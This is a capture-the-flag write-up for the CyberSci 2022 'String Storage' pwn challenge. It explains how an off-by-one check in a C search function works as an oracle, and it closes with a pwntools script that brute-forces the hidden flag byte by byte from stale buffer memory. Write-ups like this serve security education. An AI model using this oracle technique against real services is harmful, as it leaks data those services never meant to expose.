---
title: CyberSci 2022 - pwn - String Storage
slug: string-storage
date: 2022-11-12
author: Andre Cura
description: Abusing an off-by-one error in a search query to extract dereferenced data
---

## About the challenge

<!-- [Link to provided source code](/files/string-storage/main.c) -->

This challenge is the only pwn challenge in CyberSci 2022 and is worth 300 points.

For this challenge, we were only provided with the source code.
An instance of the program is spawned when we connect to the given port during the CTF.

---

## Initial Exploration

Since we were not given a binary for the challenge,
we can assume that the expected exploit should not require any
specific kind of memory corruption.

Looking at `main`, we see a global buffer being allocated, and some multiple calls to `add_entry`.
We also see a conditional addition and removal of `CTFKEY`.

```c
// main program body
int main() {
    stringArea = malloc(MAXENTRYSIZE * 16);

    add_entry("Test entry one\n");
    add_entry("Test entry two\n");
    add_entry("Test entry three\n");
    add_entry("Yet another test entry here!\n");

#ifdef PREPPUZZLE
    // add_entry("TEST\n");
    add_entry(CTFKEY);
    remove_entry(CTFKEY);

#endif
    
    while(1){
        process_user_input();
    }

    return 0;
}
```

`add_entry` will add the string in the next available and large enough area in `stringArea`

```c
//add a string entry, places it in the next large enough slot in our string buffer
int add_entry(char *entryString)
{
    debug_printf("adding %s \n", entryString);
    int string_space_needed = strlen(entryString) - 1;
    // if the list is empty, just make a new entry at the beginning
    if(entry_list_head == NULL){
        entry_list_head = create_entry(entryString, stringArea, string_space_needed);
    }
    //otherwise go through the items
    //if the item is the first, check if there is a gap big enough infront 
    //then check if there is a gap in between
    else{
        
        struct entry *current = entry_list_head;

        char *last_string_start = current->entry_string;
        char *last_string_end = last_string_start + current->entry_size;

        
        while(current->next !=NULL){
            debug_printf("element\n");
            current = current->next;
            last_string_start = current->entry_string;
            last_string_end = last_string_start + current->entry_size;
        }
        //if we are at end of list, just make a new entry at the end
        current->next = create_entry(entryString, last_string_end, string_space_needed);
    }
}
```

`create_entry` simply places the string in the indicated area in the buffer.

```c
//helper function to make a new entry
entry * create_entry(char * entry_string, char * string_location, int string_len){
    entry *new_entry = malloc(sizeof(entry));
    if(!new_entry){
        exit(-1);
    }
    new_entry->entry_string = string_location;
    new_entry->entry_size = string_len;
    strncpy(new_entry->entry_string, entry_string, string_len);
    new_entry->next = NULL;
    return new_entry;
}
```

The `remove_entry` function can be used to "delete" an entry.
What it actually does is it removes all references to the first entry
that matches with `string`, marking the area as free.

```c
//remove an entry that matches the string
int remove_entry(char *string){
    entry *current = entry_list_head;
    entry *previous = current;
    while(current != NULL){
        int string_len = strlen(string) - 1;
        //first check if strings are same length
        if(string_len == current->entry_size){
            //DEBUG
            debug_printf("same len \n");
            if (strncmp(string, current->entry_string, current->entry_size) ==0)
            {
                printf("found match\n");
                previous->next = current->next;
                if(current == entry_list_head){
                    entry_list_head = current->next;
                }
                free(current);
                return 1;
            }
        }
        //move along
        previous = current;
        current = current->next;
    }
    printf("no match found\n");
}
```

The critical part of the program is `search_entries`, as it was noted to be broken.
Notice that instead of looking for entries that match the string,
it doesn't work because `entry_len` is defined to be one more than the current entry size.
This results in the program checking one extra byte when searching for entries.
So, if we were to search for an entry that we know exists, `search_entry`
will not find a match.

```c
// loop through all the entries and print if there are any matches
//DEVELOLPER NOTE: this seems broken.....
int search_entries(char *string){
    entry *current = entry_list_head;
    int in_len = strlen(string) -1;
    while (current != NULL)
    {
        //check that the srtings are the same length
        int entry_len = current->entry_size + 1; 
        if(in_len == entry_len){
            debug_printf("matching len (%d,%d)   \n",in_len,entry_len);
            if (strncmp(string, current->entry_string, entry_len) == 0)
            {
                printf("found match\n");
                return 1;
            }
        }
        //move along
        current = current->next;
    }
    printf("no match found\n");
    return 0;
}
```
Because of the broken `search_entry` function, we would need to be able to know what the next character
is in `stringArea` after the entry we're searching.

## Strategy

In a way, `search_entry` is an oracle to determining the contents of `CTFKEY`.
Since we know the entry before `CTFKEY`,
we can use that entry as a search query string, guess the first character of `CTFKEY`,
add that to our search query, and see if we get a match or not.

Once we figured out the first character of `CTFKEY` we can extend our search query string
to guess for the second character. To do that, we will remove the entry before `CTFKEY`,
then add it again with the first character of `CTFKEY`.
That way, we can extend our search query string and `search_string` would peek for the second character.

We would repeat the process of brute-force searching, removal and addition until we reveal the whole flag.

## Exploit code

```py
from pwn import *
from string import printable

attack_remote = False

if attack_remote:
    p = remote('10.0.2.43', 10001)
else:
    elf = ELF('./main')
    p = elf.process()

search_payload = b'Yet another test entry here!'

while True:
    guess_bytes = [bytes(c, 'utf-8') for c in printable]
    found_valid_byte = False
    for guess in guess_bytes:
        p.sendline(b'search')
        p.recvuntil(b'search for?\n')
        print('payload: %s' % (search_payload + guess))
        p.sendline(search_payload + guess)
        result = p.recvuntil(b'or search :\n')
        if b"found match" in result:
            p.sendline(b'remove')
            p.sendline(search_payload)
            p.recvuntil(b'or search :\n')
            search_payload = search_payload + guess
            p.sendline(b'add')
            p.sendline(search_payload)
            p.recvuntil(b'or search :\n')
            found_valid_byte = True
            break
    # if we didn't find any more valid bytes, just quit
    if not found_valid_byte:
        break

print(search_payload[28:])
```
